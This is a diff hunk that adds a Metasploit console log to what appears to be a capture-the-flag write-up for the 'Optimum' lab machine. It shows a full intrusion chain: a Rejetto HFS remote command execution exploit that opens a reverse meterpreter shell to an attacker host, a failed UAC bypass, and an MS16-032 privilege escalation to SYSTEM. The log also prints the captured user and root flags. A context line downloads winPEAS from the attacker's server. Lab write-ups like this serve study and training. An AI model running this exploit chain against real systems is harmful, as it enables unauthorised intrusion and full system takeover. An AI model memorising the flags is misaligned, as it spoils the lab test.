@@ -49,3 +49,459 @@ C:\Users\kostas\Desktop>powershell -c "curl http://10.10.14.18/winPEASx64.exe -O
 References:
 https://nullarmor.github.io/posts/optimum
 https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/
+
+============================================
+MSFCONSOLE
+============================================
+msf6 > search hfs
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
+
+msf6 > use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) > options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating we
+                                         b server
+   Proxies                     no        A proxy chain of format type:host:por
+                                         t[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identi
+                                         fier, or hosts file with syntax 'file
+                                         :<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface t
+                                         o listen on. This must be an address
+                                         on the local machine or 0.0.0.0 to li
+                                         sten on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connec
+                                         tions
+   SSLCert                     no        Path to a custom SSL certificate (def
+                                         ault is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (defa
+                                         ult is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
+RHOSTS => 10.10.10.8
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.9
+LHOST => 10.10.14.9
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] Using URL: http://0.0.0.0:8080/M7mhwhKdhrT6hOt
+[*] Local IP: http://192.168.4.71:8080/M7mhwhKdhrT6hOt
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /M7mhwhKdhrT6hOt
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[!] Tried to delete %TEMP%\bNLoSulM.vbs, unknown result
+[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.8:49162) at 2021-06-04 19:58:48 +0300
+[*] Server stopped.
+
+meterpreter > shell
+Process 1340 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+11/06/2021  04:58 ��    <DIR>          .
+11/06/2021  04:58 ��    <DIR>          ..
+11/06/2021  04:58 ��    <DIR>          %TEMP%
+18/03/2017  03:11 ��           760.320 hfs.exe
+18/03/2017  03:13 ��                32 user.txt.txt
+               2 File(s)        760.352 bytes
+               3 Dir(s)  31.861.129.216 bytes free
+
+C:\Users\kostas\Desktop>type user.txt.txt
+type user.txt.txt
+d0c39409d7b994a9a1389ebf38ef5f73
+C:\Users\kostas\Desktop>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID                                        
+============== ===========================================
+optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+ERROR: Unable to get user claims information.
+
+C:\Users\kostas\Desktop>exit
+exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User            Path
+ ---   ----  ----         ----  -------  ----            ----
+ 0     0     [System Pro
+             cess]
+ 4     0     System
+ 232   4     smss.exe
+ 304   480   spoolsv.exe
+ 332   324   csrss.exe
+ 384   324   wininit.exe
+ 396   376   csrss.exe
+ 440   376   winlogon.ex
+             e
+ 480   384   services.ex
+             e
+ 488   384   lsass.exe
+ 548   480   svchost.exe
+ 576   480   svchost.exe
+ 588   480   VGAuthServi
+             ce.exe
+ 664   440   dwm.exe
+ 672   480   svchost.exe
+ 704   480   svchost.exe
+ 760   480   svchost.exe
+ 836   480   svchost.exe
+ 852   480   svchost.exe
+ 952   548   WmiPrvSE.ex
+             e
+ 968   480   svchost.exe
+ 1036  480   vmtoolsd.ex
+             e
+ 1052  480   ManagementA
+             gentHost.ex
+             e
+ 1212  480   svchost.exe
+ 1460  480   dllhost.exe
+ 1584  480   WmiApSrv.ex
+             e
+ 1672  548   WmiPrvSE.ex
+             e
+ 1688  480   msdtc.exe
+ 1800  704   taskhostex.  x64   1        OPTIMUM\kostas  C:\Windows\System32\t
+             exe                                         askhostex.exe
+ 1940  2020  explorer.ex  x64   1        OPTIMUM\kostas  C:\Windows\explorer.e
+             e                                           xe
+ 2280  2924  ztETdAsYHYf  x86   1        OPTIMUM\kostas  C:\Users\kostas\AppDa
+             ktu.exe                                     ta\Local\Temp\rad5D6E
+                                                         C.tmp\ztETdAsYHYfktu.
+                                                         exe
+ 2364  2448  conhost.exe  x64   1        OPTIMUM\kostas  C:\Windows\System32\c
+                                                         onhost.exe
+ 2448  2280  cmd.exe      x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\c
+                                                         md.exe
+ 2484  1940  vmtoolsd.ex  x64   1        OPTIMUM\kostas  C:\Program Files\VMwa
+             e                                           re\VMware Tools\vmtoo
+                                                         lsd.exe
+ 2512  1940  hfs.exe      x86   1        OPTIMUM\kostas  C:\Users\kostas\Deskt
+                                                         op\hfs.exe
+ 2924  2512  wscript.exe  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\w
+                                                         script.exe
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.8 - Collecting local exploits for x86/windows...
+[*] 10.10.10.8 - 38 exploit checks are being tried...
+[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/bypassuac_eventvwr
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > options
+
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.9:4444 -> 10.10.10.8:49162 (10.10.10.8)
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
+session => 1
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.10.14.9
+LHOST => 10.10.14.9
+msf6 exploit(windows/local/bypassuac_eventvwr) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > options
+
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.9       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/bypassuac_eventvwr) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.9:4444 -> 10.10.10.8:49162 (10.10.10.8)
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.9
+LHOST => 10.10.14.9
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.9       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\HJsOFrPJxAz.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3600
+[*] Executing exploit script...
+	 __ __ ___ ___   ___     ___ ___ ___ 
+	|  V  |  _|_  | |  _|___|   |_  |_  |
+	|     |_  |_| |_| . |___| | |_  |  _|
+	|_|_|_|___|_____|___|   |___|___|___|
+	                                    
+	               [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 2152
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 2148
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+Mp7W1DHAObGlgjug6vYiXk5s8jyVEg4x
+[+] Executed on target machine.
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.9:4444 -> 10.10.10.8:49163) at 2021-06-04 20:08:39 +0300
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\HJsOFrPJxAz.ps1
+
+meterpreter > shell
+Process 816 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+ERROR: Unable to get group membership information.
+
+C:\Users\kostas\Desktop>cd ../../
+cd ../../
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users
+
+18/03/2017  02:57 ��    <DIR>          .
+18/03/2017  02:57 ��    <DIR>          ..
+18/03/2017  02:52 ��    <DIR>          Administrator
+18/03/2017  02:57 ��    <DIR>          kostas
+22/08/2013  06:39 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  31.899.996.160 bytes free
+
+C:\Users>cd Administrator/desktop
+cd Administrator/desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\Administrator\Desktop
+
+18/03/2017  03:14 ��    <DIR>          .
+18/03/2017  03:14 ��    <DIR>          ..
+18/03/2017  03:14 ��                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  31.899.996.160 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+51ed1b36553c8461f4552c2e92b3eeed
